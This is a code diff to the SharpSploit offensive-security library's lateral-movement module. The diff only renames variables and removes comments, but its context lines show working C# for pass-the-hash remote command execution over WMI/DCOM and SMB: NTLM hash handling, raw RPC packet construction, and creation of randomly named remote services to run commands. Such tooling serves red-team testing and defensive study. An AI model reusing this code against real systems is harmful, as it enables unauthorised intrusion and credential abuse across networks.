@@ -90,7 +90,7 @@ namespace SharpSploit.LateralMovement
             string Output_Username = String.Empty;
             string WMI_Random_Port_String = null;
             string Target_Long = String.Empty;
-            string WMI_client_stage = String.Empty;
+            string WMI_Client_Stage = String.Empty;
             string WMI_Data = String.Empty;
             string OXID = String.Empty;
             StringBuilder output = new StringBuilder();
@@ -551,7 +551,7 @@ namespace SharpSploit.LateralMovement
                             OXID_Index = WMI_Data.IndexOf(OXID);
                             OXID_Bytes_Index = OXID_Index / 2;
                             Object_UUID2 = Utilities.GetByteRange(WMI_Client_Receive, OXID_Bytes_Index + 16, OXID_Bytes_Index + 31);
-                            WMI_client_stage = "AlterContext";
+                            WMI_Client_Stage = "AlterContext";
                         }
                         else
                         {
@@ -561,22 +561,22 @@ namespace SharpSploit.LateralMovement
 
                         //Moving on to Command Execution
                         int Request_Split_Index = 5500;
-                        string WMI_client_stage_next = "";
+                        string WMI_Client_Stage_Next = "";
                         bool Request_Split = false;
 
-                        while (WMI_client_stage != "exit")
+                        while (WMI_Client_Stage != "exit")
                         {
-                            if (debug) { output.AppendLine(WMI_client_stage); }
+                            if (debug) { output.AppendLine(WMI_Client_Stage); }
                             if (WMI_Client_Receive[2] == 3)
                             {
                                 string Error_Code = BitConverter.ToString(new byte[] { WMI_Client_Receive[27], WMI_Client_Receive[26], WMI_Client_Receive[25], WMI_Client_Receive[24] });
                                 string[] Error_Code_Array = Error_Code.Split('-');
                                 Error_Code = string.Join("", Error_Code_Array);
                                 output.AppendLine(String.Format("Execution failed with error code: 0x{0}", Error_Code.ToString()));
-                                WMI_client_stage = "exit";
+                                WMI_Client_Stage = "exit";
                             }
 
-                            switch (WMI_client_stage)
+                            switch (WMI_Client_Stage)
                             {
                                 case "AlterContext":
                                     {
@@ -587,7 +587,7 @@ namespace SharpSploit.LateralMovement
                                                     Alter_Context_Call_ID = new byte[] { 0x03, 0x00, 0x00, 0x00 };
                                                     Alter_Context_Context_ID = new byte[] { 0x02, 0x00 };
                                                     Alter_Context_UUID = new byte[] { 0xd6, 0x1c, 0x78, 0xd4, 0xd3, 0xe5, 0xdf, 0x44, 0xad, 0x94, 0x93, 0x0e, 0xfe, 0x48, 0xa8, 0x87 };
-                                                    WMI_client_stage_next = "Request";
+                                                    WMI_Client_Stage_Next = "Request";
                                                 }
                                                 break;
                                             case 1:
@@ -595,7 +595,7 @@ namespace SharpSploit.LateralMovement
                                                     Alter_Context_Call_ID = new byte[] { 0x04, 0x00, 0x00, 0x00 };
                                                     Alter_Context_Context_ID = new byte[] { 0x03, 0x00 };
                                                     Alter_Context_UUID = new byte[] { 0x18, 0xad, 0x09, 0xf3, 0x6a, 0xd8, 0xd0, 0x11, 0xa0, 0x75, 0x00, 0xc0, 0x4f, 0xb6, 0x88, 0x20 };
-                                                    WMI_client_stage_next = "Request";
+                                                    WMI_Client_Stage_Next = "Request";
                                                 }
                                                 break;
                                             case 6:
@@ -603,14 +603,14 @@ namespace SharpSploit.LateralMovement
                                                     Alter_Context_Call_ID = new byte[] { 0x09, 0x00, 0x00, 0x00 };
                                                     Alter_Context_Context_ID = new byte[] { 0x04, 0x00 };
                                                     Alter_Context_UUID = new byte[] { 0x99, 0xdc, 0x56, 0x95, 0x8c, 0x82, 0xcf, 0x11, 0xa3, 0x7e, 0x00, 0xaa, 0x00, 0x32, 0x40, 0xc7 };
-                                                    WMI_client_stage_next = "Request";
+                                                    WMI_Client_Stage_Next = "Request";
                                                 }
                                                 break;
                                         }
                                         Packet_RPC = WMIExec.RPCAlterContext(Assoc_Group, Alter_Context_Call_ID, Alter_Context_Context_ID, Alter_Context_UUID);
                                         WMI_Client_Send = Utilities.ConvertFromPacketOrderedDictionary(Packet_RPC);
                                         WMI_Client_Receive = SendStream(WMI_Client_Random_Port_Stream, WMI_Client_Send);
-                                        WMI_client_stage = WMI_client_stage_next;
+                                        WMI_Client_Stage = WMI_Client_Stage_Next;
                                     }
                                     break;
                                 case "Request":
@@ -627,7 +627,7 @@ namespace SharpSploit.LateralMovement
                                                     Request_Opnum = new byte[] { 0x03, 0x00 };
                                                     Request_UUID = Object_UUID2;
                                                     Hostname_Length = BitConverter.GetBytes(Auth_Hostname.Length + 1);
-                                                    WMI_client_stage_next = "AlterContext";
+                                                    WMI_Client_Stage_Next = "AlterContext";
 
                                                     if (Convert.ToBoolean(Auth_Hostname.Length % 2))
                                                     {
@@ -658,7 +658,7 @@ namespace SharpSploit.LateralMovement
                                                     Request_Context_ID = new byte[] { 0x03, 0x00 };
                                                     Request_Opnum = new byte[] { 0x03, 0x00 };
                                                     Request_UUID = IPID;
-                                                    WMI_client_stage_next = "Request";
+                                                    WMI_Client_Stage_Next = "Request";
                                                     Stub_Data = (new byte[] { 0x05, 0x00, 0x07, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 })
                                                         .Concat(Causality_ID_Bytes)
                                                         .Concat(new byte[] { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 }).ToArray();
@@ -675,7 +675,7 @@ namespace SharpSploit.LateralMovement
                                                     Request_UUID = IPID;
                                                     WMI_Namespace_Length = BitConverter.GetBytes(Target_Short.Length + 14);
                                                     WMI_Namespace_Unicode = Encoding.Unicode.GetBytes("\\\\" + Target_Short + "\\root\\cimv2");
-                                                    WMI_client_stage_next = "Request";
+                                                    WMI_Client_Stage_Next = "Request";
 
                                                     if (Convert.ToBoolean(Target_Short.Length % 2))
                                                     {
@@ -707,7 +707,7 @@ namespace SharpSploit.LateralMovement
                                                     Request_Call_ID = new byte[] { 0x06, 0x00, 0x00, 0x00 };
                                                     Request_Opnum = new byte[] { 0x05, 0x00 };
                                                     Request_UUID = Object_UUID;
-                                                    WMI_client_stage_next = "Request";
+                                                    WMI_Client_Stage_Next = "Request";
                                                     WMI_Data = BitConverter.ToString(WMI_Client_Receive).Replace("-", "");
                                                     OXID_Index = WMI_Data.IndexOf(OXID);
                                                     OXID_Bytes_Index = OXID_Index / 2;
@@ -725,7 +725,7 @@ namespace SharpSploit.LateralMovement
                                                     Request_Call_ID = new byte[] { 0x07, 0x00, 0x00, 0x00 };
                                                     Request_Opnum = new byte[] { 0x03, 0x00 };
                                                     Request_UUID = Object_UUID;
-                                                    WMI_client_stage_next = "Request";
+                                                    WMI_Client_Stage_Next = "Request";
                                                     Packet_Rem_Query_Interface = WMIExec.DCOMRemQueryInterface(Causality_ID_Bytes, IPID2, new byte[] { 0x9e, 0xc1, 0xfc, 0xc3, 0x70, 0xa9, 0xd2, 0x11, 0x8b, 0x5a, 0x00, 0xa0, 0xc9, 0xb7, 0xc9, 0xc4 });
                                                     Stub_Data = Utilities.ConvertFromPacketOrderedDictionary(Packet_Rem_Query_Interface);
 
@@ -741,7 +741,7 @@ namespace SharpSploit.LateralMovement
                                                     Request_Context_ID = new byte[] { 0x00, 0x00 };
                                                     Request_Opnum = new byte[] { 0x03, 0x00 };
                                                     Request_UUID = Object_UUID;
-                                                    WMI_client_stage_next = "AlterContext";
+                                                    WMI_Client_Stage_Next = "AlterContext";
                                                     Packet_Rem_Query_Interface = WMIExec.DCOMRemQueryInterface(Causality_ID_Bytes, IPID2, new byte[] { 0x83, 0xb2, 0x96, 0xb1, 0xb4, 0xba, 0x1a, 0x10, 0xb6, 0x9c, 0x00, 0xaa, 0x00, 0x34, 0x1d, 0x07 });
                                                     Stub_Data = Utilities.ConvertFromPacketOrderedDictionary(Packet_Rem_Query_Interface);
                                                 }
@@ -755,7 +755,7 @@ namespace SharpSploit.LateralMovement
                                                     Request_Call_ID = new byte[] { 0x09, 0x00, 0x00, 0x00 };
                                                     Request_Opnum = new byte[] { 0x06, 0x00 };
                                                     Request_UUID = IPID2;
-                                                    WMI_client_stage_next = "Request";
+                                                    WMI_Client_Stage_Next = "Request";
 
                                                     Stub_Data = (new byte[] { 0x05, 0x00, 0x07, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 })
                                                         .Concat(Causality_ID_Bytes)
@@ -771,7 +771,7 @@ namespace SharpSploit.LateralMovement
                                                     Request_Call_ID = new byte[] { 0x10, 0x00, 0x00, 0x00 };
                                                     Request_Opnum = new byte[] { 0x06, 0x00 };
                                                     Request_UUID = IPID2;
-                                                    WMI_client_stage_next = "Request";
+                                                    WMI_Client_Stage_Next = "Request";
 
                                                     Stub_Data = (new byte[] { 0x05, 0x00, 0x07, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 })
                                                         .Concat(Causality_ID_Bytes)
@@ -835,7 +835,7 @@ namespace SharpSploit.LateralMovement
                                                         if (Stub_Data.Length < Request_Split_Index)
                                                         {
                                                             Request_Flags = new byte[] { 0x83 };
-                                                            WMI_client_stage_next = "Result";
+                                                            WMI_Client_Stage_Next = "Result";
                                                         }
                                                         else
                                                         {
@@ -849,7 +849,7 @@ namespace SharpSploit.LateralMovement
                                                                 Sequence_Number_Counter = 10;
                                                                 Request_Flags = new byte[] { 0x81 };
                                                                 Request_Split_Index_Tracker = Request_Split_Index;
-                                                                WMI_client_stage_next = "Request";
+                                                                WMI_Client_Stage_Next = "Request";
                                                             }
                                                             else if (Request_Split_Stage == Request_Split_stage_final)
                                                             {
@@ -858,7 +858,7 @@ namespace SharpSploit.LateralMovement
                                                                 Request_Split_Stage = 0;
                                                                 Stub_Data = Utilities.GetByteRange(Stub_Data, Request_Split_Index_Tracker, Stub_Data.Length);
                                                                 Request_Flags = new byte[] { 0x82 };
-                                                                WMI_client_stage_next = "Result";
+                                                                WMI_Client_Stage_Next = "Result";
                                                             }
                                                             else
                                                             {
@@ -869,7 +869,7 @@ namespace SharpSploit.LateralMovement
                                                                 Sequence_Number = BitConverter.GetBytes(Sequence_Number_Counter);
                                                                 Sequence_Number_Counter++;
                                                                 Request_Flags = new byte[] { 0x80 };
-                                                                WMI_client_stage_next = "Request";
+                                                                WMI_Client_Stage_Next = "Request";
                                                             }
                                                         }
 
@@ -911,7 +911,7 @@ namespace SharpSploit.LateralMovement
                                             WMI_Client_Random_Port_Stream.Read(WMI_Client_Receive, 0, WMI_Client_Receive.Length);
                                             Thread.Sleep(10);
                                         }
-                                        WMI_client_stage = WMI_client_stage_next;
+                                        WMI_Client_Stage = WMI_Client_Stage_Next;
                                     }
                                     break;
                                 case "Result":
@@ -928,7 +928,7 @@ namespace SharpSploit.LateralMovement
                                             success = true;
                                         }
 
-                                        WMI_client_stage = "exit";
+                                        WMI_Client_Stage = "exit";
                                     }
                                     break;
                             }
@@ -1006,6 +1006,7 @@ namespace SharpSploit.LateralMovement
 
             return sb.ToString();
         }
+        
         /// <summary>
         /// Execute a command against multiple targets using Pass the Hash and SMB
         /// </summary>
@@ -1147,7 +1148,6 @@ namespace SharpSploit.LateralMovement
                                 if (BitConverter.ToString(new byte[] { SMBClientReceive[4], SMBClientReceive[5], SMBClientReceive[6], SMBClientReceive[7] }).ToLower() == "ff-53-4d-42")
                                 {
                                     ForceSMB1 = true;
-                                    //SMB_version = "SMB1";
                                     if (debug) { output.AppendLine("Using SMB1"); }
                                     SMBClientStage = "NTLMSSPNegotiate";
                                     if (BitConverter.ToString(new byte[] { SMBClientReceive[39] }).ToLower() == "0f")
@@ -1230,7 +1230,7 @@ namespace SharpSploit.LateralMovement
                                     Packet_SMB2_Header = new OrderedDictionary();
                                     SMB2_Message_ID += 1;
                                     Packet_SMB2_Header = SMBExec.SMB2Header(new byte[] { 0x01, 0x00 }, SMB2_Message_ID, SMB2_Tree_ID, SMB_Session_ID);
-                                    Packet_NTLMSSP_Negotiate = SMBExec.NTLMSSPNegotiate(SMB_Negotiate_Flags, null); //need to see if Packet_version works? Maybe this is just left over?
+                                    Packet_NTLMSSP_Negotiate = SMBExec.NTLMSSPNegotiate(SMB_Negotiate_Flags, null);
                                     SMB2_Header = Utilities.ConvertFromPacketOrderedDictionary(Packet_SMB2_Header);
                                     NTLMSSP_Negotiate = Utilities.ConvertFromPacketOrderedDictionary(Packet_NTLMSSP_Negotiate);
                                     Packet_SMB2_Data = SMBExec.SMB2SessionSetupRequest(NTLMSSP_Negotiate);
@@ -1260,7 +1260,6 @@ namespace SharpSploit.LateralMovement
                 string hash2 = "";
                 for (int i = 0; i < hash.Length - 1; i += 2) { hash2 += (hash.Substring(i, 2) + "-"); };
                 byte[] NTLM_hash_bytes = (Utilities.ConvertStringToByteArray(hash.Replace("-", "")));
-                //string[] hash_string_array = hash2.Split('-');
                 string Auth_Hostname = Environment.MachineName;
                 byte[] Auth_Hostname_Bytes = Encoding.Unicode.GetBytes(Auth_Hostname);
                 byte[] Auth_Domain_Bytes = Encoding.Unicode.GetBytes(domain);
@@ -1414,26 +1413,26 @@ namespace SharpSploit.LateralMovement
                     }
 
                     byte[] SMB_named_pipe_UUID = { 0x81, 0xbb, 0x7a, 0x36, 0x44, 0x98, 0xf1, 0x35, 0xad, 0x32, 0x98, 0xf0, 0x38, 0x00, 0x10, 0x03 };
-                    byte[] SMB_Service_bytes;
+                    byte[] SMB_Service_Bytes;
                     string SMB_Service = null;
                     if (string.IsNullOrEmpty(ServiceName))
                     {
                         const string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ";
                         var rand = new Random();
                         SMB_Service = new string(Enumerable.Repeat(chars, 20).Select(s => s[rand.Next(s.Length)]).ToArray());
-                        SMB_Service_bytes = Encoding.Unicode.GetBytes(SMB_Service).Concat(new byte[] { 0x00, 0x00, 0x00, 0x00 }).ToArray();
+                        SMB_Service_Bytes = Encoding.Unicode.GetBytes(SMB_Service).Concat(new byte[] { 0x00, 0x00, 0x00, 0x00 }).ToArray();
                     }
                     else
                     {
                         SMB_Service = ServiceName;
-                        SMB_Service_bytes = Encoding.Unicode.GetBytes(SMB_Service);
+                        SMB_Service_Bytes = Encoding.Unicode.GetBytes(SMB_Service);
                         if (Convert.ToBoolean(SMB_Service.Length % 2))
                         {
-                            SMB_Service_bytes = SMB_Service_bytes.Concat(new byte[] { 0x00, 0x00 }).ToArray();
+                            SMB_Service_Bytes = SMB_Service_Bytes.Concat(new byte[] { 0x00, 0x00 }).ToArray();
                         }
                         else
                         {
-                            SMB_Service_bytes = SMB_Service_bytes.Concat(new byte[] { 0x00, 0x00, 0x00, 0x00 }).ToArray();
+                            SMB_Service_Bytes = SMB_Service_Bytes.Concat(new byte[] { 0x00, 0x00, 0x00, 0x00 }).ToArray();
                         }
                     }
                     if (debug) { output.AppendLine(String.Format("Service Name is {0}", SMB_Service)); }
@@ -1613,7 +1612,7 @@ namespace SharpSploit.LateralMovement
                                             Packet_SMB_Header["SMBHeader_Signature"] = SMB_Signing_Sequence;
                                         }
 
-                                        Packet_SCM_Data = SMBExec.SCMOpenSCManagerW(SMB_Service_bytes, SMB_Service_Length);
+                                        Packet_SCM_Data = SMBExec.SCMOpenSCManagerW(SMB_Service_Bytes, SMB_Service_Length);
                                         SCM_Data = Utilities.ConvertFromPacketOrderedDictionary(Packet_SCM_Data);
                                         Packet_RPC_Data = SMBExec.RPCRequest(new byte[] { 0x03 }, SCM_Data.Length, 0, 0, new byte[] { 0x01, 0x00, 0x00, 0x00 }, new byte[] { 0x00, 0x00 }, new byte[] { 0x0f, 0x00 }, null);
                                         RPC_Data = Utilities.ConvertFromPacketOrderedDictionary(Packet_RPC_Data);
@@ -1644,7 +1643,7 @@ namespace SharpSploit.LateralMovement
                                             SMB_Service_Manager_Context_Handle = Utilities.GetByteRange(SMBClientReceive, 88, 107);
                                             if (SMB_execute)
                                             {
-                                                Packet_SCM_Data = SMBExec.SCMCreateServiceW(SMB_Service_Manager_Context_Handle, SMB_Service_bytes, SMB_Service_Length, SMBExec_Command, SMBExec_Command_Length_bytes);
+                                                Packet_SCM_Data = SMBExec.SCMCreateServiceW(SMB_Service_Manager_Context_Handle, SMB_Service_Bytes, SMB_Service_Length, SMBExec_Command, SMBExec_Command_Length_bytes);
                                                 SCM_Data = Utilities.ConvertFromPacketOrderedDictionary(Packet_SCM_Data);
                                                 if (SCM_Data.Length < SMB_Split_Index)
                                                 {
@@ -1694,7 +1693,7 @@ namespace SharpSploit.LateralMovement
                                             Packet_SMB_Header["SMBHeader_Signature"] = SMB_Signing_Sequence;
                                         }
 
-                                        Packet_SCM_Data = SMBExec.SCMCreateServiceW(SMB_Service_Manager_Context_Handle, SMB_Service_bytes, SMB_Service_Length, SMBExec_Command, SMBExec_Command_Length_bytes);
+                                        Packet_SCM_Data = SMBExec.SCMCreateServiceW(SMB_Service_Manager_Context_Handle, SMB_Service_Bytes, SMB_Service_Length, SMBExec_Command, SMBExec_Command_Length_bytes);
                                         SCM_Data = Utilities.ConvertFromPacketOrderedDictionary(Packet_SCM_Data);
                                         Packet_RPC_Data = SMBExec.RPCRequest(new byte[] { 0x03 }, SCM_Data.Length, 0, 0, new byte[] { 0x02, 0x00, 0x00, 0x00 }, new byte[] { 0x00, 0x00 }, new byte[] { 0x0c, 0x00 }, null);
                                         RPC_Data = Utilities.ConvertFromPacketOrderedDictionary(Packet_RPC_Data);
@@ -2231,7 +2230,7 @@ namespace SharpSploit.LateralMovement
                                         {
                                             Packet_SMB2_Header["SMB2Header_Flags"] = new byte[] { 0x08, 0x00, 0x00, 0x00 };
                                         }
-                                        Packet_SCM_Data = SMBExec.SCMOpenSCManagerW(SMB_Service_bytes, SMB_Service_Length);
+                                        Packet_SCM_Data = SMBExec.SCMOpenSCManagerW(SMB_Service_Bytes, SMB_Service_Length);
                                         SCM_Data = Utilities.ConvertFromPacketOrderedDictionary(Packet_SCM_Data);
                                         Packet_RPC_Data = SMBExec.RPCRequest(new byte[] { 0x03 }, SCM_Data.Length, 0, 0, new byte[] { 0x01, 0x00, 0x00, 0x00 }, new byte[] { 0x00, 0x00 }, new byte[] { 0x0f, 0x00 }, null);
                                         RPC_Data = Utilities.ConvertFromPacketOrderedDictionary(Packet_RPC_Data);
@@ -2265,7 +2264,7 @@ namespace SharpSploit.LateralMovement
                                             SMB_Service_Manager_Context_Handle = Utilities.GetByteRange(SMBClientReceive, 108, 127);
                                             if (SMB_execute)
                                             {
-                                                Packet_SCM_Data = SMBExec.SCMCreateServiceW(SMB_Service_Manager_Context_Handle, SMB_Service_bytes, SMB_Service_Length, SMBExec_Command, SMBExec_Command_Length_bytes);
+                                                Packet_SCM_Data = SMBExec.SCMCreateServiceW(SMB_Service_Manager_Context_Handle, SMB_Service_Bytes, SMB_Service_Length, SMBExec_Command, SMBExec_Command_Length_bytes);
                                                 SCM_Data = Utilities.ConvertFromPacketOrderedDictionary(Packet_SCM_Data);
                                                 if (SCM_Data.Length < SMB_Split_Index)
                                                 {
